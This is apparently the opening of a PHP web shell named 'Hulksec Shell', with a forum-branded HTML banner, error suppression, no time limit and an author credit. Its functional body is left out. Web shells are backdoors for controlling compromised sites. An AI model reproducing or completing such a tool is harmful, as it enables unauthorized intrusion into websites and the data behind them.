...
<center>
<font face="Bungee" size="5">Hulksec Shell</font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center><img src="https://i.imgur.com/ouDVeUE.jpg" width="280" height="280" title="ZeroDayForums" alt="OdayForums" class="center" />
<br><br><br>
<?php
set_time_limit(0);
error_reporting(0);
...
function author() {
    echo "<center><br>CODED BY N4M3L355</center>";
    exit();
}
